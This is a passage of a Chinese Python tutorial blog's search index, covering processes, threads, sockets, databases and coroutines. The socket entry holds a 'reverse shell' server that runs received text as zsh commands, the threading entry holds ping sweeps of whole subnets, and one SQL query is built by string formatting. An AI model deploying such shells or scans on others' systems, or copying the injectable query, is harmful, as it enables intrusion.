file.mp4 不投屏只录屏：scrcpy -Nr file.mp4 录制声音结合：https://github.com/rom1v/usbaudio document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>scrcpy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-进程]]></title>
    <url>%2Fposts%2F58862%2F</url>
    <content type="text"><![CDATA[并发： 任务数大于cpu个数 并行： cpu个数和任务数相同 GIL 锁: 任何python进程中，一次永远只有一个线程运行 一个python进程 只能执行一个线程 创建进程## 不同操作系统创建进程的区别： #linux上: fork() import os import time pid = os.fork() # 这个地方会创建一个子进程， 他的pid号值永远为0 if pid == 0: print("我是子进程") time.sleep(3) else: print("我是父进程") time.sleep(3) # win上创建进程 类似于导入机制 都通用的 import multiprocessing def func(): print("000") if __name__ == '__main__': p = multiprocessing.Process(target=func) # 生成进程, 传参target= ，args= p.start() # 开启进程， 相当于一个子进程 进程标识# 进程标识 pid import time import os import multiprocessing def func(): time.sleep(5) if __name__ == "__main__": print("main pid ", os.getpid()) # 当前进程的 print(multiprocessing.current_process().pid) p = multiprocessing.Process(target=func) print(p.pid) p.start() # start之后才有pid号 print(p.pid) time.sleep(10) # 线程的标识是 ident # 操作系统调用的是进程 """ 注意！ 操作系统并不能看到线程的标识。 因为，线程是由Python解释器 来负责调度的。 操作系统仅需要调度进程就行了 """ 守护进程# 守护进程 daemon = True 主进程结束之后，子进程跟着结束（某子进程的生命周期随着主进程） import time import multiprocessing def func(): time.sleep(20) print("子进程结束") if __name__ == "__main__": p = multiprocessing.Process(target=func, daemon = True) p.daemon = True # 设置成守护进程 p True会随着主进程结束而结束， 主进程不会等待子进程结束 p.start() time.sleep(3) 终止进程# 终止进程 import multiprocessing import time def func(): time.sleep(5) print(multiprocessing.current_process()) if __name__ == "__main__": p = multiprocessing.Process(target=func) p.start() time.sleep(2) # 主进程2s p.terminate() # 结束,主进程结束，不管子进程有没有结束，就终止子进程（线程没有这个） 面向对象# 面向对象 类继承创建进程 # start() --> run(已经是在新的进程了) --> target # target是由默认的run运行 import multiprocessing import time class My_Process(multiprocessing.Process): def __init__(self, *args, **kwargs): super().__init__(args, kwargs) print("初始化...") def run(self): """ start 默认调用的方法 重写啦在这里 :return: """ print("run...") self.task() time.sleep(5) def task(self): print("task...") if __name__ == "__main__": p = My_Process() p.start() # start 方法会调用run # 创建进程的方式 ： multiprocessing.Process 类继承，重写run linux下：fork # 如果换成是线程的话：换掉继承类就行 进程通信# -*- coding:utf-8 -*- import multiprocessing from multiprocessing import Manager # 管理器 def func(l): l.append(111) if __name__ == '__main__': manager = Manager() # 实例化 先开启一个公共进程，并返回一个管理器 l = manager.list() # 开启空间，左边就是代理 # l = manager.dict() """ 一般常用的空间类型是： 1. mgr.list() 2. mgr.dict() 3. mgr.Queue() """ print(l) p = multiprocessing.Process(target=func, args=(l,)) p.start() p.join() print(l) # 这样使用manager之后 l就是【共享】的了 进程池 &amp; 线程池 ps:有点乱 # from multiprocessing import Pool # 进程池 from multiprocessing.dummy import Pool #线程池 from multiprocessing.pool import ThreadPool # 线程池 import threading import time def func(i): print("{}-------555".format(i)) time.sleep(2) return i def print_back(*args, **kwargs): print("处理数据完成",args, kwargs) pool = Pool(6) # 不写的话 默认是cpu的个数 # print(threading.active_count()) for i in range(5): pool.apply_async(func=func, args=(i,), callback=print_back) ## 添加任务 不阻塞 主要使用的方法 # pool.apply(func=func, ) ## 添加任务 阻塞 # pool.map(func, [i for i in range(5)]) #添加任务 不阻塞 pool.close() #关闭线程池 不在提交新的任务 pool.join() #等待进程池中的任务执行完毕 print("任务结束") ########### 线程池的步骤 p = ThreadPool(3) # 实例化 p.apply_async(func) # 函数 # 可以将返回值.get() 但是get也会i阻塞 p.close() p.join() # join()语句要放在close()语句后面 # 进程池比线程池耗费资源 # 可以将返回值.get() 但是get也会i阻塞 async_result = p.apply_async(func) # 函数 print(async_result.get()) 使用进程池来实现并发服务器# 使用池来实现并发服务器 # 先开一个进程池， 每个进程下面再开一个线程 import socket from multiprocessing import Pool, cpu_count from multiprocessing.pool import ThreadPool def woeker_thread(conn): # 使用线程池来 while True: recv_data =conn.recv(1000) if recv_data: print(recv_data) conn.send(recv_data) else: conn.close() break def worker_process(server): # 使用进程池来接收套接字 # pool = Pool(cpu_count()*2) # 通常可以分配2倍的cpu个数 pool = ThreadPool(cpu_count()) # 获取电脑核心数 while True: conn, addr = server.accept() pool.apply_async(woeker_thread, args=(conn,)) if __name__ == '__main__': server = socket.socket() server.bind(('127.0.0.1', 8888)) server.listen(1000) n = cpu_count() # 获得当前计算机的cpu核心数量 pool = Pool(n) for i in range(n): # 充分利用cpu，为每个cpu分配一个进程 # conn, addr = server.accept() pool.apply_async(func=worker_process, args=(server,)) pool.apply_async(func=worker_process, args=(server,)) pool.close() pool.join() document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>进程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-数据库编程]]></title>
    <url>%2Fposts%2F57831%2F</url>
    <content type="text"><![CDATA[Python DBA API包含的内容 访问数据库流程 与MySQLimport pymysql db_config = { 'host': '127.0.0.1', 'user': 'hhh', 'password': '123', 'db': 'test', 'charset': 'utf8' } # 插入 try: conn = pymysql.connect(**db_config) cursor = conn.cursor() # 插入 id = '2018002' name = 'admin' age = 18 # insert into student values(id,name,age) sql = 'insert into student(id, name, age) values(%s,%s,%s)' cursor.execute(sql, (id, name, age)) # 删除 # table = 'students' # condittion = 'age > 20' # sql = 'delete from {table} where {condittion}'.format(table=table, condittion=condittion) # 查询 sql = "SELECT password FROM admin WHERE name='%s'" % (name) cursor.execute(sql) pws = cursor.fetchall() except: print('error') conn.rollback() finally: conn.commit() # 数据有变动一定记得提交/双保险 cursor.close() conn.close() cursor对象支持的方法 与MongoDBfrom pymongo import * #建立连接 client = MongoClient('127.0.0.1',27017) #指定数据库 db = client.test #指定集合 collection = db.col # print(type(collection),collection) # python连接mongodb就搞定 mydict ={ '_id': 6, 'name': 'admin', 'age': 18, 'addr': 'didu' } # collection.insert(mydict) # print(collection.find()) # for i in collection.find(): # print(i) # for i in collection.find({'name':'zhanglinlin'}): # print(i) collection.update({'name':'zhanglinlin'},{'$set':{'age':22}},{'mult':'true'}) # collection.remove() 与redisimport redis # # 连接,给定参数ip/port， redis默认端口6379 r = redis.Redis(host='127.0.0.1', port='6379') # # print(type(r),r) # # # 设置键值对 r.set('name', 'admin') # # 获取该键的值 str = r.get('name') print(str.decode('utf-8')) # 解码 ## 自动解码 参数：decode_responses=True r = redis.Redis(host='127.0.0.1',port='6379',decode_responses=True) r.set('name','哈哈') str = r.get('name') print(str) ## StrictRedis r = redis.StrictRedis(host='127.0.0.1',port='6379') r.set('name','哈哈') str = r.get('name') print(str,str.decode('utf-8')) ## `Redis`和`StrictRedis`区别：Redis兼容旧版本python2 # k_v = { 'a1':'a', 'a2':'b', 'a3':'c' } r = redis.StrictRedis(host='127.0.0.1',port='6379') # 批量设置值 r.mset(**k_v) # 批量取值 print(r.mget('a1','a2','a3')) # r = redis.StrictRedis(host='127.0.0.1',port='6379') # 往列表添加值从头部开始 r.lpush('list1','haha') r.lpush('list1',3,4,5) # 获取列表值 print(r.lrange('list1',0,-1)) # r = redis.StrictRedis(host='127.0.0.1',port='6379') r.sadd('set1','aa') r.sadd('set2','aa',8,10,'bb') print(r.smembers('set2')) 与memcachedimport memcache # 建立连接 mc = memcache.Client(['127.0.0.1:11211'], debug=True) # 设置一个 mc.set('name', 'xps',time=60) # 设置多个 mc.set_multi({"username":"handsome", "gender":"man"}, time=60) # 获取一个 mc.get('age') # 获取多个 # 不管是元组还是列表都行，只要可迭代就行 res1 = mc.get_multi(("username", "gender")) res2 = mc.get_multi(["username", "gender"]) print(res1) print(res2) # 删除一个 mc.delete("key") # 删除多个 mc.delete_multi(["key1", "key2"]) """ # 0表示永不过期 断电就会完蛋 适合做验证码 # prepend 前插 # append 后插 # telnet ip port 远程连接 """ 这里仅仅做了简单的介绍，具体还需要自己练习中学习 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-多线程]]></title>
    <url>%2Fposts%2F59675%2F</url>
    <content type="text"><![CDATA[讲解进程是程序的一次执行。每个进程都有自己的地址空间、内存、数据栈以及其他记录运行轨迹的辅助数据 线程所有的线程运行在同一个进程当中，共享相同的运行环境。线程有：开始、顺序执行、结束 三个部分。多个线程协同完成一个进程的任务。 我们在编写安全工具的时候，使用多线程要更多些(使用多进程相对较少) thread 缺点：程序复杂时，不能计算线程数量和控制，稳定性不太好 使用_thread.start_new_thread(ping_check, (ip,)) ，第一个参数是回调函数，第二个的可变参数(tuple类型的) Note： 必须配合time.sleep() 实例: """ 使用ping检查C段机器(一个C段是0-255) """ import _thread import time import re from subprocess import Popen,PIPE def ping_check(ip_addr): # 一个执行系统命令的模块 check = Popen(['/bin/bash', '-c', 'ping -c 2 '+ip_addr], stdin=PIPE,stdout=PIPE) data = check.stdout.read() # 返回的数据 if 'ttl' in str(data): print("{} is up".format(ip_addr)) def main(ip_three): for i in range(255): ip = ip_three + '.' + str(i) _thread.start_new_thread(ping_check, (ip,)) time.sleep(0.1) if __name__ == '__main__': ip_three = input("输入ip地址的前三个字节(不需要最后一个点): \n") # 判断最后是否有点 pattern = r'\.$' has_point = re.findall(pattern, ip_three) if has_point: ip_three = ip_three[:-1] print(ip_three) main(ip_three) threading (重点)1.Thead类 使用threading模块 子类化Thread类 解决了线程数量可控的问题 简单例子： import threading import time import requests def func1(key): print("Hello %s:%s"%(key, time.ctime())) print(threading.current_thread()) # 当前线程 print("*"*20) def main(): threads = [] keys = ['张三', '李四', '王五', '陆大人'] threads_count = len(keys) # 生成参数长度个线程数 for i in range(threads_count): t = threading.Thread(target=func1, args=(keys[i],)) threads.append(t) # 线程加入线程列表 # 启动线程 for i in range(threads_count): threads[i].start() # 等待线程结束 join() for i in range(threads_count): threads[i].join() # 保证【所有】的线程都会结束 再运行主线程 遇到join会阻塞 if __name__ == '__main__': main() 实例: """ 对百度以10个线程访问10次 """ import threading import time import requests import sys def func1(): time_start = time.time() r = requests.get(url='http://www.baidu.com') times = time.time() - time_start # 耗时 sys.stdout.write("Status:%s---%s---%s"%(r.status_code, times, time.strftime("%H:%M:%S"))) # 当前时间 print("") def main(): threads = [] threads_count = 10 # 定义 线程数 # 生成参数长度个线程数 for i in range(threads_count): t = threading.Thread(target=func1) threads.append(t) # 线程加入线程列表 # 启动线程 for i in range(threads_count): threads[i].start() # 等待线程结束 join() for i in range(threads_count): threads[i].join() # 保证【所有】的线程都会结束 再运行主线程 遇到join会阻塞 if __name__ == '__main__': main() 2.生产者-消费者问题 和 Queue模块 (重中之重)\ Queue模块[ qsize(), empty(), full(), put(), get() ] 完美搭档：Queue + Thread 解决了生产参数和计算结果时间都不确定的问题 最常使用 Queue： 将产生的货物放到Queue中，消费者从Queue中拿数据 import Queue q = queue.Queue(100) # 可以直接指定队列的大小 for i in range(10): q.put(i) # 也可以这样放入 q.empty() # 查看是否为空 q.qsize() # 查看大小 q.get() # 依次取出数据 q.full() # 是否满了 queue.task_done() # 告诉队列，这个任务执行完成了 生产者消费者讲解： """ 所谓，生产者与消费者模型，其实是把一个需要进程通信的问题分开考虑 生产者，只需要往队列里面丢东西（生产者不需要关心消费者） 消费者，只需要从队列里面拿东西（消费者也不需要关心生产者 生产者： 只关心队列是否已满。 没满，则生产，满了就阻塞。 消费者： 只关心队列是否为空。 不为空，则消费，为空则阻塞。 """ from threading import Thread # 线程 import random import queue import threading import time class Produce(Thread): def __init__(self, queue): super().__init__() self.queue = queue def run(self): while True: item = random.randint(0,99) if self.queue.full(): print("当前队列长度{}".format(self.queue.qsize())) self.queue.put(item) # 只要队列没满， 向队列存入数据 print("生产者%s ==> 已经生产 %s, 并将其加入到了队列中" %(threading.current_thread(),item)) class Consumer(Thread): def __init__(self, queue): super().__init__() self.queue = queue def run(self): while True: item = self.queue.get() # 只要队列不为空， 就从队列中取出数据 print("消费者 ==> 从队列中取出 %s" %item) self.queue.task_done() # 告诉队列，这个任务执行完成了 if __name__ == '__main__': q = queue.Queue(10000) p = Produce(q) p1 = Produce(q) c = Consumer(q) p.start() p1.start() time.sleep(5) c.start() 实例： """ 使用 threding 和 Quque 结合， ping_check """ import threading import queue # 注意是小写 from subprocess import Popen,PIPE import sys # 继承多线程的类 class DoRun(threading.Thread): def __init__(self, queue): # threading.Thread.__init__(self) super().__init__() self._queue = queue # 重写了run方法 def run(self): # 如果Queue不为空就继续执行 while not self._queue.empty(): ip = self._queue.get() check_ping = Popen(['/bin/bash','-c','ping -c 2 '+ip], stdin=PIPE, stdout=PIPE) data = check_ping.stdout.read() if 'ttl' in str(data): sys.stdout.write(ip + " is up") print() def main(): threads = [] threads_count = 10 # 创建一个空的队列 q = queue.Queue() # put到队列 for i in range(1,255): q.put("123.206.96."+str(i)) # 多线程 for i in range(threads_count): threads.append(DoRun(q)) # 启动 for i in threads: i.start() for i in threads: i.join() if __name__ == '__main__': main() document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-socket编程]]></title>
    <url>%2Fposts%2F15426%2F</url>
    <content type="text"><![CDATA[讲解C/S架构客户机和服务器结构Server唯一的目的就是等待client的请求，client连上server发送必要的数据，然后等待server端完成请求的范阔 C/S网络编程Server端进行设置，首先创建一个通信端点，让server端能够监听请求，之后就进入等待和处理Client请求的无限循环中 Client编程相对Server端编程简单，只要创建一个通信端点，建立到服务器的连接，就可以提出wing我就来 套接字(socket)是一种具有之前所说的“通信端点”概念的计算机网络数据结构。网络化的应用程序在开始任何通讯之前都必须创建套接字 套接字 = (ip, 端口) Python支持: - AF_UNIX –&gt; Unix下进行通信的 - AF_NETLINK –&gt; 是Linux下的套接字 - AF_INET –&gt; 是基于网络的套接字 （我们下面的重点） Python的socket模块创建TCP/IP套接字，方法如下： # 参数（套接字家族，套接字类型） # AF_INET：基于网络的， SOCK_SREAM：代表TCP/IP tcp_scoket = socket(socket.AF_INET, socket.SOCK_SREAM) 套接字对象的方法： 服务端套接字函数： 公共用途套接字函数： 创建连接之后要关闭 实例:## 1.创建-个TCP服务器 SS. = socket() #创建服务器套接字 ss.bind() #把地址绑定到套接字上 s.listen() #监听连接 inf loop; #服务器无限循环 CS.= ss.accept() #接受客户端连接 cmmon loop; #通信循环 s.recy0/cs.send0 #对话(接受与发送) cs.close0 #关闭客户端套接字 ## 2、创建一个TCP客户端 cs.socket() #创建客户端套接字 cs.connect() #尝试连接套接字 common loop: #通信循环 cs.recx0/cs.send() #对话(接受与发送) cs.close() #关闭客户端套接字 反弹Shell： 在客户端获取服务端的shell 1.获取Linux的shell： server.py """ 反弹shell """ import socket from subprocess import Popen,PIPE # 执行系统命令 HOST = '' # 如果是本机最为服务端，地址可以不用填写 PORT = 8888 BUFSIZE = 1024 ADDR = (HOST,PORT) tcp_server = socket.socket() # type默认是tcp tcp_server.bind(ADDR) tcp_server.listen(5) print("开始监听") while True: # 服务端和客户端的循环连接 print("Waiting fpr connecting...") coon, addr = tcp_server.accept() # 获取对等套接字(conn), 以及客户端地址(addr). 这个【只执行一次】，放到外面防止阻塞 print("... connected from:" + str(addr)) # 下面是通信的循环 while True: data = coon.recv(BUFSIZE) # 读取客户端发送的消息 （指明一次性能接收的最大字节数量） if data: try: # 执行获取服务端的系统命令（在客户端连接后可以执行服务端的命令） cmd = Popen(['/bin/zsh', '-c', data], stdin=PIPE, stdout=PIPE) cmd_data = cmd.stdout.read() coon.send(cmd_data) except Exception: continue else: print("客户端{}已断开".format(addr)) break 2.获取Window的shell： client.py不变 import socket HOST = '' # 如果是本机最为服务端，地址可以不用填写 PORT = 8888 BUFSIZE = 1024 ADDR = (HOST,PORT) tcp_cient = socket.socket() tcp_cient.connect(ADDR) print("客户端：\n") # 数据交互循环 while True: msg = input('>>>') if msg: tcp_cient.send(msg.encode()) # 只能发送 bytes 类型的数据 data = tcp_cient.recv(BUFSIZE) if not data: break print(data.decode()) else: break # tcp_cient.close() # c.close() # 主动断开 # 服务端会recv到一个空字符串 1.阻塞的套接字 阻塞套接字不能和多个客户端进行通信 server.py """ 服务端： 阻塞套接字： ---> 阻塞套接字不能和多个客户端进行通信 """ import socket HOST = '' # 如果是本机最为服务端，地址可以不用填写 PORT = 8888 BUFSIZE = 1024 ADDR = (HOST,PORT) tcp_server = socket.socket() # type默认是tcp #tcp_server.bind(('',8888)) tcp_server.bind(ADDR) tcp_server.listen(5) # 可以挂起的最大连接数 accept就不算挂起 print("开始监听") while True: # 服务端和客户端的循环连接 print("Waiting fpr connecting...") coon, addr = tcp_server.accept() # 获取对等套接字(conn), 以及客户端地址(addr). 这个【只执行一次】，放到外面防止阻塞 print("... connected from:" + str(addr)) # 下面是通信的循环 while True: data = coon.recv(BUFSIZE) # 读取客户端发送的消息 （指明一次性能接收的最大字节数量） if data: print(data.decode()) # 向client发送收到的信息 coon.send(data) else: print("客户端{}已断开".format(addr)) break #server端关闭连接 #tcp_server.close() #accpet 阻塞 recv阻塞(读不到数据，就一直等到有数据为止) client.py """ 最简单的客户端 三种方式的客户端都是一样的 """ import socket HOST = '' # 如果是本机最为服务端，地址可以不用填写 PORT = 8888 BUFSIZE = 1024 ADDR = (HOST,PORT) tcp_cient = socket.socket() tcp_cient.connect(ADDR) print("客户端：\n") # 数据交互循环 while True: msg = input('>>>') if msg: tcp_cient.send(msg.encode()) # 只能发送 bytes 类型的数据 data = tcp_cient.recv(BUFSIZE) if not data: break print(data.decode()) else: break # tcp_cient.close() # c.close() # 主动断开 # 服务端会recv到一个空字符串 2.I/O多路复用的套接字server.py """ 服务端 I/O多路复用 """ # IO多路复用 # epoll 事件通知事件 # IO事件 计算机 可读事件（有数据了...） # 通知机制 （某一事情发送之后，可读之后） 轮询 # epoll： 当socket变为可读的时候，发出通知 # epoll： 是惰性的事件回调： 操作系统只起到通知的作用。 # epoll： 目前Linux上效率最高的IO多路复用 技术 ！ # 1.监听套接字 2.对等套接字 import socket import selectors # windows没有epoll sel = selectors.DefaultSelector() # 会根据不同的操作系统选择相应的解释器 在linux是epoll 根据系统自动选择 sel2 = selectors.EpollSelector() # 会根据不同的操作系统选择相应的解释器 在linux是epoll Linux server = socket.socket() server.bind(('127.0.0.1',8888)) server.listen(5) def accept(server): coon, addr = server.accept() sel.register(coon, selectors.EVENT_READ, read) def read(coon): data = coon.recv(1024) if data: print(data) server.send(data.encode()) else: print('Closing:',coon) sel.unregister(coon) # 取消监听 coon.close() # 注册事件 事件触发直接调用 sel.register(server, selectors.EVENT_READ, accept) # 监听事件的发生 参数三个： 套接字,可能发送的事件(变为可读事件),回调函数 print("开始监听") while True: events_list = sel.select() # 返回发生了事件的列表 查询已经准备好的套接字 print("有套接字发生变化") for key, _ in events_list: # 列表里面是个元组, key是元组里面的第一个值 callback = key.data # 某个套接字绑定的函数 key.data是函数 callback(key.fileobj) # 调用这个回调函数 fileobj是对应套接字 # sel.select() 有两种情况： #1. 客户端请求连接 key.data是accept key.fileobj 是server #2. 客户端请求连接 key.data是read key.fileobj 是conn """ 1.先在指定的套接字上注册对应的事件及回调 2.不断的查询所有已经准备好资源的套接字 3.不需要考虑套接字与事件只管调用 """ client.py 相同 3.非阻塞的套接字server.py """ 服务端 非阻塞套接字 """ import socket s = socket.socket() # type默认是tcp s.bind(('127.0.0.1', 8888)) # 这个必须在操作之前设置 s.setblocking(False) # 变为非阻塞套接字， 立刻返回异常 s.listen(5) client_list = [] while True: # 第一层循环只负责生成对等套接字 try: coon, addr = s.accept() # 多个coon才能与多个客户端进行通信 except BlockingIOError as e: pass else: print("客户端{}连接成功".format(addr)) coon.setblocking(False) # 设置为非阻塞 client_list.append(coon) # 保留已生成的对等套接字 # print(coon, addr) for client_socket in client_list: # 第二层循环 把所有已保留的套接字都执行一遍 try: data = client_socket.recv(1024) except BlockingIOError: pass else: if data: print('{}:{}'.format(client_socket, data.decode())) client_socket.send(data) else: print('{}'.format(client_socket)) client_socket.close() client_list.remove(client_socket) # 成功处理完一个，就移除一个 ## 实现方法：非阻塞+轮询 # connect操作一定会引发BlockingIOError异常 # 如果连接没有建立，那么send操作引发OSError异常 """ accept 阻塞： 在没有新的套接字来之前， 不能处理已经建立连接的套接字的请求 recv 阻塞: 在没有接受到客户端请求数据之前， 不能与其他客户端建立连接 """ client.py 相同 成为大师""" 1. 多练习，一定要善于发现感兴趣的内容，通过所学知识去实现 2. 关注相关领域： 寻找大师，跟随大市，与大师同行，洞察大师，成为大师 知乎，ve2x.com, github 3.扩展： 想要提高，就不能守着自己现有的东西而不去学习新的 4.应用： 根据自己的需求，动手实践，达到目标 安全： 分析行为：通过日志，分析攻击行为(re) """ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>socket</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-协程]]></title>
    <url>%2Fposts%2F52435%2F</url>
    <content type="text"><![CDATA[概念1.进程(同步)进程是系统进行资源分配和调度的一个独立单位。每个进程都有自己的独立内存空间，不同进程通过进程间通信来通信。 上下文进程间的切换开销，比较大，但相对比较稳定安全 2.线程（同步）线程是CPU调度和分派的基本单位。 线程间通信主要通过共享内存，上下文切换很快，资源开销较少，但相比进程不够稳定容易丢失数据。 3.协程（异步）协程是一种用户态的轻量级线程，协程的调度完全由用户控制 “协程就是你可以暂停执行的函数”。协程拥有自己的寄存器上下文和栈。 非抢占式多任务 协程与线程的区别:1) 一个线程可以多个协程，一个进程也可以单独拥有多个协程。 2) 线程进程都是同步机制，而协程则是异步。 3) 协程能保留上一次调用时的状态，每次过程重入时，就相当于进入上一次调用的状态。 4）线程是抢占式，而协程是非抢占式的，所以需要用户自己释放使用权来切换到其他协程，因此同一时间其实只有一个协程拥有运行权，相当于单线程的能力。 5）协程并不是取代线程, 而且抽象于线程之上, 线程是被分割的CPU资源, 协程是组织好的代码流程, 协程需要线程来承载运行, 线程是协程的资源, 但协程不会直接使用线程, 协程直接利用的是执行器(Interceptor), 执行器可以关联任意线程或线程池, 可以使当前线程, UI线程, 或新建新程.。 6）线程是协程的资源。协程通过Interceptor来间接使用线程这个资源。 代码greenlet # 协程 =>又叫：非抢占式多任务 # 中断执行 # 线程 """ pip install greenlet """ # 基本使用 from greenlet import greenlet import random import time def Producer(): while True: item = random.randint(0, 99) print("pro生产了{}".format(item)) c.switch(item) # 暂停当前协程,切换到(执行的协程)消费者，并将item传入消费者 time.sleep(1) def Consumer(): while True: item = p.switch() # 切换到生产者， 并等待消费者传入item print("消费了{}".format(item)) c = greenlet(Consumer) # 将一个普通函数变成协程 p = greenlet(Producer) c.switch() # 让消费者先进入暂停状态， （只有恢复的时候才能接受数据） """ # greenlet 的价值 价值一： 高性能的原生协程 价值二： 语义更加明确的显式切换 价值三： 直接将函数包装成协程，保持原有代码风格 """ gevent gevent是一个基于协程的python网络库，在遇到IO阻塞时，程序会自动进行切换，可以让我们用同步的方式写异步IO代码。 # gevent # 当一个greenlet遇到IO操作，比如访问网络，就会自动切换，直到IO操作完成，再切换回来 # 遇到阻塞就切换到另一个协程继续执行 ！ """ pip install gevent gevent，通过封装了 libev（基于epoll） 和 greenlet 两个库。 帮我们做好封装，允许我们以类似于线程的方式使用协程。 以至于我们几乎不用重写原来的代码就能充分利用 epoll 和 协程 威力 """ import gevent from gevent.queue import Queue # 猴子补丁 monkey 将一些阻塞的模块动态的修改为非阻塞 from gevent import monkey;monkey.patch_all() # 不会阻塞了就 from gevent import monkey;monkey.patch_socket() # 不会阻塞了就 import requests import gevent def get_response(): print("start") requests.get("https://www.baidu.com") print("end") tasks = [gevent.spawn(get_response) for i in range(20)] # 创建协程 gevent.joinall(tasks) # 阻塞等待协程完毕 # --------------------------------------------------------------------- ### gevent 并发服务器 import gevent # 将python内置的socket直接换成了IO多路复用的socket from gevent import monkey;monkey.patch_socket() import socket server = socket.socket() server.bind(('127.0.0.1', 8888)) server.listen(1000) def worker_coroutine(conn): while True: recv_data = conn.recv(1000) if recv_data: print(recv_data) conn.send(recv_data) else: conn.close() break if __name__ == '__main__': while True: conn, remote_addr = server.accept() # 生成一个协程， 并将conn作为参数传入 gevent.spawn(worker_coroutine, conn) # --------------------------------------------------------------------- # gevent 协程通信 """ 问题一： 协程之间不是能通过switch通信嘛？ 是的，由于 gevent 基于 greenlet，所以可以。 问题二： 那为什么还要考虑通信问题？ 因为 gevent 不需要我们使用手动切换， 而是遇到阻塞就切换，因此我们不会去使用switch ！ """ import gevent from gevent import monkey;monkey.patch_all() from gevent.queue import Queue import random queue = Queue(3) def Producer(): while True: item = random.randint(0, 99) print("生产了{}".format(item)) queue.put(item) def Consumer(): while True: item = queue.get() print("消费了{}".format(item)) p = gevent.spawn(Producer, queue) # 将函数封装成协程， 并开始调度 c = gevent.spawn(Consumer, queue) # gevent.sleep(5) gevent.joinall([p, c]) # 阻塞（一阻塞就切换协程） 等待 等待你带进来的所有协程对象结束 Note: # 这三句一定要放在最上面 import gevent from gevent import monkey monkey.patch_all() document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>协程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-自带的线程池和进程池]]></title>
    <url>%2Fposts%2F13775%2F</url>
    <content type="text"><![CDATA[# from multiprocessing import Pool # 进程池 from multiprocessing.dummy import Pool #线程池 from multiprocessing.pool import ThreadPool # 线程池 import threading import time def func(i): print("{}-------555".format(i)) time.sleep(2) return i def print_back(*args, **kwargs): print("处理数据完成",args, kwargs) pool = Pool(6) # 不写的话 默认是cpu的个数 # print(threading.active_count()) for i in range(5): pool.apply_async(func=func, args=(i,), callback=print_back) ## 添加任务 不阻塞 主要使用的方法 # pool.apply(func=func, ) ## 添加任务 阻塞 # pool.map(func, [i for i in range(5)]) #添加任务 不阻塞 pool.close() #关闭线程池 不在提交新的任务 pool.join() #等待进程池中的任务执行完毕 print("任务结束") ########### 线程池的步骤 p = ThreadPool(3) # 实例化 p.apply_async(func) # 函数 # 可以将返回值.get() 但是get也会i阻塞 p.close() p.join() # 进程池比线程池耗费资源 # 可以将返回值.get() 但是get也会i阻塞 async_result = p.apply_async(func) # 函数 print(async_result.get()) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>线程池</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-线程池并发服务器]]></title>
    <url>%2Fposts%2F36711%2F</url>
